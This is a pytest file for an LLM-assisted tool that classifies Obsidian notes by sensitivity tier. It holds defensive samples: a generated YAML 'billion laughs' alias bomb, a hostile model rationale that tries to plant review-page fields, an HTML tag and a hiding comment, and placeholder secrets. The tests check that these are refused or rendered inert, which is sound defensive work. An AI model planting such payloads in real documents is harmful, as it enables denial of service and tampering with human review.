"""test_classify_notes.py — invariants of the classification assistant.

No test here makes a model call. The LLM layer is exercised through a fake
client, because what needs guarding is not the model's taste but the
mechanics around it: that frontmatter is edited surgically, that a verdict is
only ever written upward, that the deterministic detectors cannot be skipped,
and that the tracking hash ignores churn Obsidian introduces on its own.
"""
from __future__ import annotations

import json
from pathlib import Path

import pytest
import yaml

import classify_notes as C


# ---------------------------------------------------------------------------
# Fake model client.
# ---------------------------------------------------------------------------

class _Usage:
    input_tokens = 10
    output_tokens = 5
    cache_creation_input_tokens = 0
    cache_read_input_tokens = 0


class _Block:
    def __init__(self, text: str) -> None:
        self.text = text


class _Response:
    def __init__(self, text: str) -> None:
        self.content = [_Block(text)]
        self.usage = _Usage()


class FakeClient:
    """Returns a scripted verdict and records the prompts it was handed."""

    def __init__(self, tier: str = "confidential", *, rationale: str = "because",
                 confidence: str = "high", raw: str | None = None) -> None:
        self._raw = raw if raw is not None else json.dumps(
            {"tier": tier, "confidence": confidence, "rationale": rationale})
        self.calls: list[dict] = []
        self.messages = self

    def create(self, **kwargs):
        self.calls.append(kwargs)
        return _Response(self._raw)


@pytest.fixture(autouse=True)
def _no_usage_log(monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> None:
    """Keep per-call usage accounting out of the real state dir."""
    monkeypatch.setenv("USAGE_LOG_PATH", str(tmp_path / "usage.jsonl"))


@pytest.fixture
def vault(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> Path:
    """A vault root the module treats as its own, with the edit guard off."""
    root = tmp_path / "Vault"
    (root / "Knowledge").mkdir(parents=True)
    monkeypatch.setattr(C, "VAULT_ROOT", root)
    monkeypatch.setattr(C, "RECENT_EDIT_GUARD_SECONDS", 0)
    return root


def write(vault: Path, rel: str, body: str, **fm: object) -> Path:
    p = vault / rel
    p.parent.mkdir(parents=True, exist_ok=True)
    if fm:
        lines = "\n".join(f"{k.replace('__', '_')}: {v}" for k, v in fm.items())
        p.write_text(f"---\n{lines}\n---\n\n{body}\n", encoding="utf-8")
    else:
        p.write_text(body + "\n", encoding="utf-8")
    return p


def fm_of(path: Path) -> dict:
    fm_body, _, _ = C.split_frontmatter(path.read_text(encoding="utf-8"))
    return C.parse_fm(fm_body)


# ---------------------------------------------------------------------------
# Frontmatter splicing — surgical, never a YAML round trip.
# ---------------------------------------------------------------------------

def test_splice_appends_without_touching_existing_keys():
    src = "---\ntitle: Foo\ntags:\n  - a\n  - b\nclassification: internal-use-only\n---\n\nBody.\n"
    out = C.splice_frontmatter(src, {"classification_reviewed": "false"})
    assert out == (
        "---\ntitle: Foo\ntags:\n  - a\n  - b\nclassification: internal-use-only\n"
        "classification_reviewed: false\n---\n\nBody.\n")


def test_splice_replaces_scalar_in_place():
    src = "---\ntitle: Foo\nclassification: public\nother: 1\n---\nBody\n"
    out = C.splice_frontmatter(src, {"classification": "restricted"})
    assert out == "---\ntitle: Foo\nclassification: restricted\nother: 1\n---\nBody\n"


def test_splice_consumes_a_multiline_list_when_replacing_its_key():
    src = "---\ntags:\n  - a\n  - b\ntitle: Foo\n---\nBody\n"
    assert C.splice_frontmatter(src, {"tags": "[]"}) == (
        "---\ntags: []\ntitle: Foo\n---\nBody\n")


def test_splice_creates_frontmatter_when_absent():
    assert C.splice_frontmatter("Just a body.\n", {"classification": "public"}) == (
        "---\nclassification: public\n---\n\nJust a body.\n")


def test_splice_preserves_crlf_without_doubling_the_cr():
    # Building the block with `lf` inline and translating afterwards turned each
    # CRLF into CR+CRLF. Assert the exact bytes, not just "contains".
    src = "---\r\ntitle: Foo\r\n---\r\nBody\r\n"
    assert C.splice_frontmatter(src, {"classification": "public"}) == (
        "---\r\ntitle: Foo\r\nclassification: public\r\n---\r\nBody\r\n")


def test_splice_leaves_a_horizontal_rule_in_the_body_alone():
    src = "---\ntitle: Foo\n---\nintro\n\n---\n\nmore\n"
    assert C.splice_frontmatter(src, {"classification": "public"}) == (
        "---\ntitle: Foo\nclassification: public\n---\nintro\n\n---\n\nmore\n")


# ---------------------------------------------------------------------------
# Rationale quoting — must survive Obsidian stripping the quotes.
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("raw", [
    "auto-applied by detector [ssn]: US Social Security number",
    'He said "no" - pipe | and #4',
    "- leading dash: {braces} [brackets]",
    "Contains PHI: patient name, DOB",
])
def test_rationale_parses_identically_quoted_and_unquoted(raw: str):
    quoted = C.yaml_quote(raw)
    assert quoted.startswith('"') and quoted.endswith('"')
    as_quoted = yaml.safe_load(f"r: {quoted}\n")["r"]
    as_stripped = yaml.safe_load(f"r: {quoted[1:-1]}\n")["r"]
    assert as_quoted == as_stripped
    assert isinstance(as_quoted, str) and as_quoted


# ---------------------------------------------------------------------------
# Tracking hash — body only.
# ---------------------------------------------------------------------------

def test_content_hash_ignores_frontmatter_churn_but_not_body_edits():
    quoted = '---\ntitle: X\nr: "a b"\n---\n\nBody text.\n'
    stripped = '---\ntitle: X\nr: a b\n---\n\nBody text.\n'
    reordered = '---\nr: a b\ntitle: X\nupdated: 2026-01-01\n---\n\nBody text.\n'
    edited = '---\ntitle: X\n---\n\nBody text CHANGED.\n'
    assert C.content_hash(quoted) == C.content_hash(stripped)
    assert C.content_hash(quoted) == C.content_hash(reordered)
    assert C.content_hash(quoted) != C.content_hash(edited)


# ---------------------------------------------------------------------------
# Tier reading and baselines.
# ---------------------------------------------------------------------------

def test_unrecognised_tier_reads_as_unset_so_it_is_re_evaluated():
    # The RAG allowlist fails closed on an unknown value, so a typo'd note is
    # already out of the index; it must not be treated as holding a tier.
    assert C.current_tier({"classification": "Uinternal-use-only"}) is None
    assert C.current_tier({"classification": '"Confidential" '}) == "confidential"
    assert C.current_tier({}) is None


def test_nothing_baselines_to_public_any_more():
    """The public tier was retired 2026-08-22. No folder floors at it, and an
    external source URL no longer demotes to it — the vault holds no
    redistribution rights to a clipped article, paywalled or not."""
    assert "public" not in C.FOLDER_BASELINE.values()
    assert C.baseline_tier("Clippings") == C.DEFAULT_TIER
    assert C.baseline_tier("Knowledge") == C.DEFAULT_TIER
    assert "public" in C.TIER_RANK, "still a valid value for a deliberate marking"


# ---------------------------------------------------------------------------
# L0 detectors — instances only, and never skippable.
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("body,expected", [
    ("SSN is 123-45-6789 on file.", ["ssn"]),
    ("Patient MRN: 4419920 admitted", ["mrn"]),
    ("AKIAIOSFODNN7EXAMPLE", ["aws-key"]),
    ("leaked sk-ant-aaaaaaaaaaaaaaaaaaaaaaaaaa here", ["anthropic-key"]),
    # Topics, not instances.
    ("We must protect PHI and comply with HIPAA and MRN policy.", []),
    ("The MRN field is indexed by the EHR.", []),
    ("call 410-555-1234", []),
    # A policy note quoting a placeholder must not classify itself.
    ("```\nsk-ant-aaaaaaaaaaaaaaaaaaaaaaaaaa\n```", []),
])
def test_detectors_fire_on_instances_only(body: str, expected: list[str]):
    assert [r[0] for r in C.run_detectors(body)] == expected


def test_detectors_still_run_on_a_note_already_marked_reviewed(vault: Path):
    """Regression: the skips once ran BEFORE the detectors, so a settled note
    that later gained a credential was never scanned again — fail open."""
    p = write(vault, "Knowledge/Settled.md",
              "Then someone pasted AKIAIOSFODNN7EXAMPLE",
              classification="internal-use-only", classification_reviewed="true")
    rec = C.process_file(p, None, dry_run=False, detectors_only=True, force=False)
    assert rec is not None and rec["action"] == "auto-applied"
    assert fm_of(p)["classification"] == "restricted"


def test_detectors_still_run_on_a_note_awaiting_review(vault: Path):
    p = write(vault, "Knowledge/Queued.md", "Then: SSN 123-45-6789",
              classification="internal-use-only",
              classification_suggested="confidential",
              classification_reviewed="false")
    rec = C.process_file(p, None, dry_run=False, detectors_only=True, force=False)
    assert rec is not None and rec["action"] == "auto-applied"
    got = fm_of(p)
    assert got["classification"] == "restricted"
    assert got["classification_prior"] == "internal-use-only"


def test_detector_auto_application_preserves_the_updated_timestamp(vault: Path):
    p = write(vault, "Knowledge/Stamped.md", "SSN 123-45-6789",
              classification="internal-use-only", updated="2026-05-26T16:06")
    C.process_file(p, None, dry_run=False, detectors_only=True, force=False)
    text = p.read_text(encoding="utf-8")
    assert "updated: 2026-05-26T16:06" in text
    assert "classification: restricted" in text


# ---------------------------------------------------------------------------
# L1 — proposes, never sets; elevates, never demotes.
# ---------------------------------------------------------------------------

def test_model_verdict_is_proposed_not_applied(vault: Path):
    p = write(vault, "Knowledge/Note.md", "personnel matter",
              classification="internal-use-only")
    client = FakeClient("confidential", rationale="named individual severance")
    rec = C.process_file(p, client, dry_run=False, detectors_only=False, force=False)
    got = fm_of(p)
    assert rec["action"] == "suggested"
    assert got["classification"] == "internal-use-only"   # untouched
    assert got["classification_suggested"] == "confidential"
    assert got["classification_reviewed"] is False
    assert "severance" in got["classification_rationale"]


def test_a_verdict_at_or_below_the_current_tier_is_discarded(vault: Path):
    for verdict in ("public", "internal-use-only"):
        p = write(vault, f"Knowledge/Same-{verdict}.md", "ordinary",
                  classification="confidential")
        before = p.read_text(encoding="utf-8")
        rec = C.process_file(p, FakeClient(verdict), dry_run=False,
                             detectors_only=False, force=False)
        assert rec is None, f"{verdict} should not be written over confidential"
        assert p.read_text(encoding="utf-8") == before


def test_an_unset_note_cannot_be_talked_down_to_public(vault: Path):
    """`public` on an unset Knowledge note is a demotion from the tier it would
    have been created with, so it must not reach classification_suggested."""
    p = write(vault, "Knowledge/Bare.md", "ordinary working note")
    rec = C.process_file(p, FakeClient("public"), dry_run=False,
                         detectors_only=False, force=False)
    got = fm_of(p)
    assert got["classification"] == C.DEFAULT_TIER
    assert "classification_suggested" not in got
    assert rec["action"] == "backfilled"


def test_a_queued_note_is_not_re_adjudicated(vault: Path):
    p = write(vault, "Knowledge/Pending.md", "ordinary",
              classification="internal-use-only",
              classification_suggested="confidential",
              classification_reviewed="false")
    client = FakeClient("restricted")
    assert C.process_file(p, client, dry_run=False, detectors_only=False,
                          force=False) is None
    assert client.calls == [], "no model call should be made for a queued note"


def test_a_reviewed_note_is_left_alone(vault: Path):
    p = write(vault, "Knowledge/Done.md", "ordinary",
              classification="internal-use-only", classification_reviewed="true")
    client = FakeClient("confidential")
    assert C.process_file(p, client, dry_run=False, detectors_only=False,
                          force=False) is None
    assert client.calls == []


def test_force_reopens_a_reviewed_note(vault: Path):
    p = write(vault, "Knowledge/Done.md", "ordinary",
              classification="internal-use-only", classification_reviewed="true")
    client = FakeClient("confidential")
    rec = C.process_file(p, client, dry_run=True, detectors_only=False, force=True)
    assert rec is not None and client.calls


def test_dry_run_writes_nothing(vault: Path):
    p = write(vault, "Knowledge/Note.md", "personnel matter",
              classification="internal-use-only")
    before = p.read_text(encoding="utf-8")
    rec = C.process_file(p, FakeClient("confidential"), dry_run=True,
                         detectors_only=False, force=False)
    assert rec["action"] == "suggested"
    assert p.read_text(encoding="utf-8") == before


def test_an_unparseable_verdict_is_reported_not_guessed(vault: Path):
    p = write(vault, "Knowledge/Note.md", "text", classification="internal-use-only")
    rec = C.process_file(p, FakeClient(raw="I'm not going to answer that."),
                         dry_run=False, detectors_only=False, force=False)
    assert rec["action"] == "error"
    assert "classification_suggested" not in fm_of(p)


def test_an_unknown_tier_name_is_rejected(vault: Path):
    p = write(vault, "Knowledge/Note.md", "text", classification="internal-use-only")
    rec = C.process_file(p, FakeClient(raw='{"tier": "top-secret"}'),
                         dry_run=False, detectors_only=False, force=False)
    assert rec["action"] == "error"


# ---------------------------------------------------------------------------
# Scope.
# ---------------------------------------------------------------------------

def test_generated_log_subtrees_are_not_queued_for_human_review(vault: Path):
    write(vault, "Meetings/2026-01-01 0900.md", "real meeting", classification="x")
    write(vault, "Meetings/_Runs/2026-01-01.md", "pipeline log")
    collected = {p.relative_to(vault).as_posix() for p in C.collect_files(None)}
    assert "Meetings/2026-01-01 0900.md" in collected
    assert "Meetings/_Runs/2026-01-01.md" not in collected


def test_scaffolding_and_archive_folders_are_skipped(vault: Path):
    for rel in ("Templates/Note Template.md", "Z_archive/old.md",
                "Z_attachments/x.md", "Knowledge/real.md"):
        write(vault, rel, "body")
    collected = {p.relative_to(vault).parts[0] for p in C.collect_files(None)}
    assert collected == {"Knowledge"}


# ---------------------------------------------------------------------------
# Reconcile — the other half of accepting a proposal.
# ---------------------------------------------------------------------------

def test_splice_can_drop_keys(vault: Path):
    src = ("---\ntitle: X\nclassification_suggested: confidential\n"
           "classification_rationale: \"why\"\nkeep: yes\n---\nBody\n")
    out = C.splice_frontmatter(
        src, {"classification_reviewed": "true"},
        drop_keys=("classification_suggested", "classification_rationale"))
    assert out == ("---\ntitle: X\nkeep: yes\n"
                   "classification_reviewed: true\n---\nBody\n")


@pytest.mark.parametrize("current,suggested,retired", [
    ("confidential", "confidential", True),    # accepted exactly
    ("restricted", "confidential", True),      # accepted and then some
    ("internal-use-only", "confidential", False),  # still an open decision
    ("public", "restricted", False),
])
def test_reconcile_retires_only_honoured_proposals(vault: Path, current: str,
                                                   suggested: str, retired: bool):
    p = write(vault, "Knowledge/N.md", "body",
              classification=current,
              classification_suggested=suggested,
              classification_rationale='"why"',
              classification_reviewed="false",
              updated="2026-05-01T09:00")
    accepted, still_open = C.reconcile([p], dry_run=False)
    got = fm_of(p)
    assert (accepted, still_open) == ((1, 0) if retired else (0, 1))
    if retired:
        assert "classification_suggested" not in got
        assert "classification_rationale" not in got
        assert got["classification_reviewed"] is True
    else:
        # An undecided note must come out byte-for-byte unchanged: this pass
        # closing a decision the reviewer has not made would be the worst
        # possible failure here.
        assert got["classification_suggested"] == suggested
        assert got["classification_reviewed"] is False
    assert "updated: 2026-05-01T09:00" in p.read_text(encoding="utf-8")


def test_reconcile_dry_run_writes_nothing(vault: Path):
    p = write(vault, "Knowledge/N.md", "body", classification="confidential",
              classification_suggested="confidential",
              classification_rationale='"why"', classification_reviewed="false")
    before = p.read_text(encoding="utf-8")
    accepted, _ = C.reconcile([p], dry_run=True)
    assert accepted == 1
    assert p.read_text(encoding="utf-8") == before


def test_reconcile_ignores_notes_with_no_proposal(vault: Path):
    p = write(vault, "Knowledge/N.md", "body", classification="public")
    before = p.read_text(encoding="utf-8")
    assert C.reconcile([p], dry_run=False) == (0, 0)
    assert p.read_text(encoding="utf-8") == before


def test_reconcile_ignores_an_unparseable_suggested_value(vault: Path):
    p = write(vault, "Knowledge/N.md", "body", classification="confidential",
              classification_suggested="top-secret",
              classification_reviewed="false")
    assert C.reconcile([p], dry_run=False) == (0, 0)
    assert fm_of(p)["classification_suggested"] == "top-secret"


# ---------------------------------------------------------------------------
# Bulk accept / reject.
# ---------------------------------------------------------------------------

def _queued(vault: Path, name: str, current: str, suggested: str,
            reviewed: str = "false", folder: str = "Knowledge") -> Path:
    return write(vault, f"{folder}/{name}.md", "body",
                 classification=current,
                 classification_suggested=suggested,
                 classification_rationale='"reason"',
                 classification_reviewed=reviewed,
                 updated="2026-05-01T09:00")


def test_accept_applies_the_tier_and_retires_the_proposal(vault: Path):
    p = _queued(vault, "N", "internal-use-only", "confidential")
    ruled, out_of_scope = C.rule_on([p], "accept", None, dry_run=False)
    got = fm_of(p)
    assert (ruled, out_of_scope) == (1, 0)
    assert got["classification"] == "confidential"
    assert got["classification_reviewed"] is True
    assert "classification_suggested" not in got
    assert "classification_rationale" not in got
    assert "updated: 2026-05-01T09:00" in p.read_text(encoding="utf-8")


def test_reject_keeps_the_proposal_as_the_record(vault: Path):
    """The declined proposal is the more useful half of a rejection, and the
    review base's "Ruled on" view reads it — so reject must not drop it."""
    p = _queued(vault, "N", "internal-use-only", "confidential")
    ruled, _ = C.rule_on([p], "reject", None, dry_run=False)
    got = fm_of(p)
    assert ruled == 1
    assert got["classification"] == "internal-use-only"      # tier untouched
    assert got["classification_suggested"] == "confidential"  # record kept
    assert got["classification_rationale"] == "reason"
    assert got["classification_reviewed"] is True


def test_tier_filter_leaves_other_tiers_untouched(vault: Path):
    conf = _queued(vault, "C", "internal-use-only", "confidential")
    rest = _queued(vault, "R", "internal-use-only", "restricted")
    before = rest.read_text(encoding="utf-8")
    ruled, out_of_scope = C.rule_on([conf, rest], "accept", "confidential",
                                    dry_run=False)
    assert (ruled, out_of_scope) == (1, 1)
    assert fm_of(conf)["classification"] == "confidential"
    assert rest.read_text(encoding="utf-8") == before


def test_an_already_settled_note_is_never_re_ruled(vault: Path):
    p = _queued(vault, "N", "internal-use-only", "confidential", reviewed="true")
    before = p.read_text(encoding="utf-8")
    assert C.rule_on([p], "accept", None, dry_run=False) == (0, 0)
    assert p.read_text(encoding="utf-8") == before


def test_bulk_dry_run_writes_nothing(vault: Path):
    p = _queued(vault, "N", "internal-use-only", "confidential")
    before = p.read_text(encoding="utf-8")
    ruled, _ = C.rule_on([p], "accept", None, dry_run=True)
    assert ruled == 1
    assert p.read_text(encoding="utf-8") == before


def test_notes_with_no_proposal_are_ignored(vault: Path):
    p = write(vault, "Knowledge/Plain.md", "body", classification="public")
    before = p.read_text(encoding="utf-8")
    assert C.rule_on([p], "accept", None, dry_run=False) == (0, 0)
    assert p.read_text(encoding="utf-8") == before


def test_an_unrecognised_proposed_tier_is_not_applied(vault: Path):
    p = _queued(vault, "N", "internal-use-only", "top-secret")
    assert C.rule_on([p], "accept", None, dry_run=False) == (0, 0)
    assert fm_of(p)["classification"] == "internal-use-only"


# ---------------------------------------------------------------------------
# Folder baselines — sensitive by class rather than by content.
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("folder,expected", [
    ("Meetings", "confidential"),
    ("People", "confidential"),
    ("Clippings", "internal-use-only"),
    ("Knowledge", "internal-use-only"),
    ("Groups", "internal-use-only"),
    ("Creations", "internal-use-only"),
])
def test_folder_baseline_floors(folder: str, expected: str):
    assert C.baseline_tier(folder) == expected


def test_an_elevated_folder_changes_what_counts_as_an_elevation(vault: Path):
    """A Meetings note the model calls confidential is now AT its baseline, so
    there is nothing to propose — the whole point of moving the floor."""
    p = write(vault, "Meetings/M.md", "personnel discussion")
    rec = C.process_file(p, FakeClient("confidential"), dry_run=False,
                         detectors_only=False, force=False)
    got = fm_of(p)
    assert got["classification"] == "confidential"     # baseline written
    assert "classification_suggested" not in got       # nothing to review
    assert rec["action"] == "backfilled"


def test_an_elevated_folder_still_surfaces_a_genuine_elevation(vault: Path):
    p = write(vault, "Meetings/M.md", "patient detail",
              classification="confidential")
    rec = C.process_file(p, FakeClient("restricted"), dry_run=False,
                         detectors_only=False, force=False)
    assert rec["action"] == "suggested"
    assert fm_of(p)["classification_suggested"] == "restricted"


# ---------------------------------------------------------------------------
# The review page (Actions/Classification Review) — the queue a person works.
# ---------------------------------------------------------------------------

def _page(vault: Path) -> str:
    return (vault / C.REVIEW_NOTE_REL).read_text(encoding="utf-8")


def _page_fm(vault: Path) -> dict:
    return fm_of(vault / C.REVIEW_NOTE_REL)


def _pending(vault: Path, rel: str, *, current: str = "internal-use-only",
             suggested: str = "confidential",
             rationale: str = '"undisclosed incident detail"') -> Path:
    return write(vault, rel, "body", classification=current,
                 classification_suggested=suggested,
                 classification_rationale=rationale,
                 classification_reviewed="false")


def test_review_page_lists_only_proposals_still_waiting(vault: Path):
    _pending(vault, "Knowledge/Waiting.md")
    # Accepted (tier raised to the suggestion), rejected, and never proposed:
    # none of these is a task any more.
    _pending(vault, "Knowledge/Accepted.md", current="confidential")
    write(vault, "Knowledge/Rejected.md", "body", classification="public",
          classification_suggested="confidential",
          classification_rationale='"x"', classification_reviewed="true")
    write(vault, "Knowledge/Plain.md", "body", classification="public")

    assert C.write_review_note(dry_run=False) == 1
    page = _page(vault)
    assert "[[Knowledge/Waiting|Waiting]]" in page
    for absent in ("Accepted", "Rejected", "Plain"):
        assert f"[[Knowledge/{absent}" not in page
    assert _page_fm(vault)["pending"] == 1


def test_review_page_fields_are_bound_to_the_note_itself(vault: Path):
    _pending(vault, "Knowledge/MTW Router Outage (2026-09-08).md")
    C.write_review_note(dry_run=False)
    page = _page(vault)
    rel = "Knowledge/MTW Router Outage (2026-09-08).md"
    assert ("`INPUT[inlineSelect(option(public), option(internal-use-only), "
            "option(confidential), option(restricted)):"
            f"{rel}#classification]`") in page
    assert f"`INPUT[toggle:{rel}#classification_reviewed]`" in page


def test_review_page_inherits_the_highest_tier_it_names(vault: Path):
    _pending(vault, "Knowledge/A.md", suggested="confidential")
    _pending(vault, "Knowledge/B.md", current="confidential", suggested="restricted")
    C.write_review_note(dry_run=False)
    assert _page_fm(vault)["classification"] == "restricted"
    # Most severe first.
    page = _page(vault)
    assert page.index("[[Knowledge/B|B]]") < page.index("[[Knowledge/A|A]]")


def test_an_empty_queue_still_writes_a_page_saying_so(vault: Path):
    assert C.write_review_note(dry_run=False) == 0
    fm = _page_fm(vault)
    assert fm["pending"] == 0
    assert fm["classification"] == C.DEFAULT_TIER
    assert "Nothing is waiting for review." in _page(vault)
    assert "INPUT[" not in _page(vault)


def test_a_rationale_cannot_plant_a_field_or_hide_the_rest_of_the_page(vault: Path):
    """The rationale is model output about note content, which can be a
    clipped web page. It must reach the page as inert text."""
    hostile = ('"see `INPUT[toggle:People/Someone.md#classification_reviewed]` '
               'and [[People/Someone]] <img src=x> %% everything below hides"')
    _pending(vault, "Knowledge/Hostile.md", rationale=hostile)
    _pending(vault, "Knowledge/Z Later.md")
    C.write_review_note(dry_run=False)
    page = _page(vault)
    # Exactly the two fields per note that the page itself put there.
    assert page.count("INPUT[") == 4
    assert "People/Someone.md#classification_reviewed" not in page
    assert "[[People/Someone" not in page
    assert "%%" not in page
    assert "<img" not in page
    assert "[[Knowledge/Z Later|Z Later]]" in page


@pytest.mark.parametrize("name", ["Q#1 plan", "a`b", "50% done", "x[1]", "a^b"])
def test_a_path_meta_bind_cannot_bind_gets_no_live_fields(vault: Path, name: str):
    _pending(vault, f"Knowledge/{name}.md")
    C.write_review_note(dry_run=False)
    page = _page(vault)
    assert "INPUT[" not in page
    assert "in its Properties panel" in page
    assert _page_fm(vault)["pending"] == 1


def test_the_review_page_is_never_itself_adjudicated(vault: Path):
    _pending(vault, "Knowledge/A.md")
    C.write_review_note(dry_run=False)
    listed = {p.relative_to(vault).as_posix() for p in C.collect_files(None)}
    assert C.REVIEW_NOTE_REL not in listed
    assert "Knowledge/A.md" in listed


def test_review_page_dry_run_writes_nothing(vault: Path):
    _pending(vault, "Knowledge/A.md")
    assert C.write_review_note(dry_run=True) == 1
    assert not (vault / C.REVIEW_NOTE_REL).exists()


def test_settling_retires_a_tier_picked_on_the_page(vault: Path):
    """Picking the tier is the whole acceptance; the next run tidies up."""
    p = _pending(vault, "Knowledge/A.md", current="confidential")
    assert C.settle_accepted(dry_run=False) == 1
    got = fm_of(p)
    assert got["classification_reviewed"] is True
    assert "classification_suggested" not in got


def test_settling_leaves_a_note_edited_moments_ago(vault: Path,
                                                   monkeypatch: pytest.MonkeyPatch):
    p = _pending(vault, "Knowledge/A.md", current="confidential")
    monkeypatch.setattr(C, "RECENT_EDIT_GUARD_SECONDS", 3600)
    assert C.settle_accepted(dry_run=False) == 0
    assert fm_of(p)["classification_suggested"] == "confidential"


def test_an_off_vpn_night_still_refreshes_the_page(vault: Path,
                                                   monkeypatch: pytest.MonkeyPatch):
    """The gateway skip returns before any model work; the page (and the
    dashboard count read from it) must not be left at yesterday's state."""
    import llm_endpoint
    accepted = _pending(vault, "Knowledge/Accepted.md", current="confidential")
    _pending(vault, "Knowledge/Waiting.md")

    def unreachable():
        raise llm_endpoint.GatewayUnreachable("gateway does not resolve")
    monkeypatch.setattr(llm_endpoint, "client", unreachable)
    monkeypatch.setattr(C.sys, "argv", ["classify_notes.py", "--vault", str(vault)])
    assert C.main() == 0
    assert fm_of(accepted)["classification_reviewed"] is True
    assert _page_fm(vault)["pending"] == 1
    assert "[[Knowledge/Waiting|Waiting]]" in _page(vault)


def test_a_command_line_ruling_refreshes_the_whole_page(vault: Path,
                                                        monkeypatch: pytest.MonkeyPatch):
    """Scoped to one --file, but the page must still list everything else."""
    target = _pending(vault, "Knowledge/A.md")
    _pending(vault, "Knowledge/B.md")
    monkeypatch.setattr(C.sys, "argv", ["classify_notes.py", "--vault", str(vault),
                                        "--reject", "--file", str(target)])
    assert C.main() == 0
    page = _page(vault)
    assert "[[Knowledge/A|A]]" not in page
    assert "[[Knowledge/B|B]]" in page
    assert _page_fm(vault)["pending"] == 1


# ---------------------------------------------------------------------------
# Accept never lowers a tier (M-DASH #248).
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("current", ["restricted", "confidential"])
def test_accept_on_a_note_already_at_or_above_its_proposal_keeps_the_tier(
        vault: Path, current: str, capsys: pytest.CaptureFixture[str]):
    """L0 can raise a queued note past its stale suggestion; accepting the
    suggestion afterwards must reconcile, not write the lower tier back."""
    p = _queued(vault, "N", current, "confidential")
    ruled, _ = C.rule_on([p], "accept", None, dry_run=False)
    got = fm_of(p)
    assert ruled == 1
    assert got["classification"] == current
    assert got["classification_reviewed"] is True
    assert "classification_suggested" not in got
    assert "classification_rationale" not in got
    assert (f"accepted, kept {current} (already at or above confidential)"
            in capsys.readouterr().out)


@pytest.mark.parametrize("action", ["accept", "set"])
def test_a_duplicate_classification_key_is_not_ruled_on(
        vault: Path, action: str, capsys: pytest.CaptureFixture[str]):
    """PyYAML reads the LAST duplicate (public) while the gates read the most
    restrictive (restricted). Accepting off the PyYAML reading would splice
    the first line to confidential and lower the effective tier."""
    p = vault / "Knowledge" / "Dup.md"
    p.write_text("---\nclassification: restricted\nclassification: public\n"
                 "classification_suggested: confidential\n"
                 "classification_reviewed: false\n---\n\nbody\n", encoding="utf-8")
    before = p.read_text(encoding="utf-8")
    ruled, _ = C.rule_on([p], action, None, dry_run=False,
                         set_tier="confidential" if action == "set" else None)
    assert ruled == 0
    assert p.read_text(encoding="utf-8") == before
    assert ("not ruled: classification cannot be read reliably: Knowledge/Dup.md"
            in capsys.readouterr().out)


def _laughs(levels: int) -> str:
    """A "billion laughs" frontmatter block: each level aliases the last ten
    times, and `title` points at the top level."""
    lines = ['l0: &l0 "lol"']
    for i in range(1, levels + 1):
        lines.append(f"l{i}: &l{i} [" + ", ".join([f"*l{i - 1}"] * 10) + "]")
    lines.append(f"title: *l{levels}")
    return "\n".join(lines)


def test_a_yaml_alias_bomb_is_refused_not_adjudicated(vault: Path):
    """Raw outsider frontmatter can carry anchors; walking the parse (str() of
    the title) expands them ~10x per level. Only booleans are asserted here --
    printing the parsed object would expand it."""
    p = vault / "Knowledge" / "Bomb.md"
    p.write_text(f"---\n{_laughs(6)}\n---\n\nbody\n", encoding="utf-8")
    client = FakeClient("confidential")
    rec = C.process_file(p, client, dry_run=False, detectors_only=False, force=False)
    assert rec is not None and rec["action"] == "error"
    assert rec["rationale"] == "frontmatter refused: YAML anchor or alias"
    assert client.calls == []
    assert C.parse_fm(_laughs(6)) == {}


# Assembled at run time so the secrets scanner does not flag this file; the
# header line is all the detector keys on.
_KEY_HEADER = "-----BEGIN OPENSSH " + "PRIVATE KEY-----"


def test_a_refused_note_still_gets_the_detectors(vault: Path):
    """An anchor in a clipping's frontmatter must not hide a credential in its
    body from L0: the tier is still raised, and the report says why."""
    import classification_tier
    p = vault / "Knowledge" / "Bomb.md"
    p.write_text(f"---\n{_laughs(6)}\n---\n\n{_KEY_HEADER}\nnot-a-real-key\n",
                 encoding="utf-8")
    client = FakeClient("confidential")
    rec = C.process_file(p, client, dry_run=False, detectors_only=False, force=False)
    assert rec is not None and rec["action"] == "error"
    assert rec["rationale"] == (
        "frontmatter refused: YAML anchor or alias; L0 detector hit "
        "(private-key): auto-applied restricted (was unset)")
    assert rec["to"] == "restricted"
    assert client.calls == []
    text = p.read_text(encoding="utf-8")
    assert classification_tier.effective(text) == ("restricted", [])
    assert "classification_prior: (unset:internal-use-only)" in text


def test_an_anchor_cannot_keep_a_public_clipping_public(vault: Path):
    """Round-3 repro: without the anchor this is auto-applied restricted; with
    it, the tier must still be raised the same way."""
    import classification_tier
    p = vault / "Clippings" / "Page.md"
    p.parent.mkdir(parents=True, exist_ok=True)
    p.write_text(f"---\nclassification: public\nsrc: &a x\n---\n\n{_KEY_HEADER}\n"
                 "not-a-real-key\n", encoding="utf-8")
    rec = C.process_file(p, None, dry_run=False, detectors_only=True, force=False)
    assert rec is not None and rec["action"] == "error"
    assert rec["rationale"].startswith("frontmatter refused: YAML anchor or alias; ")
    assert "auto-applied restricted (was public)" in rec["rationale"]
    text = p.read_text(encoding="utf-8")
    assert classification_tier.effective(text) == ("restricted", [])
    assert "classification_prior: public" in text
    assert "src: &a x" in text


def test_a_splice_the_gates_would_not_read_is_not_written(
        vault: Path, monkeypatch: pytest.MonkeyPatch):
    """Should the text splice ever land where the gates' reader does not see
    it, the write is withheld and that case is reported distinctly."""
    p = vault / "Clippings" / "Page.md"
    p.parent.mkdir(parents=True, exist_ok=True)
    p.write_text(f"---\nclassification: public\nsrc: &a x\n---\n\n{_KEY_HEADER}\n",
                 encoding="utf-8")
    before = p.read_bytes()
    monkeypatch.setattr(C, "splice_frontmatter", lambda text, updates, **_: text)
    rec = C.process_file(p, None, dry_run=False, detectors_only=True, force=False)
    assert rec is not None and rec["action"] == "error"
    assert ("restricted material, NOT applied — the tier could not be written "
            "safely; fix by hand") in rec["rationale"]
    assert p.read_bytes() == before


def test_a_refused_note_with_an_unreadable_tier_is_not_spliced(vault: Path):
    """Duplicate classification lines: the splice cannot be checked against
    what the gates read, so nothing is written and the reason is distinct."""
    p = vault / "Clippings" / "Dup.md"
    p.parent.mkdir(parents=True, exist_ok=True)
    p.write_text(f"---\nclassification: public\nclassification: public\n"
                 f"src: &a x\n---\n\n{_KEY_HEADER}\n", encoding="utf-8")
    before = p.read_bytes()
    rec = C.process_file(p, None, dry_run=False, detectors_only=True, force=False)
    assert rec is not None and rec["action"] == "error"
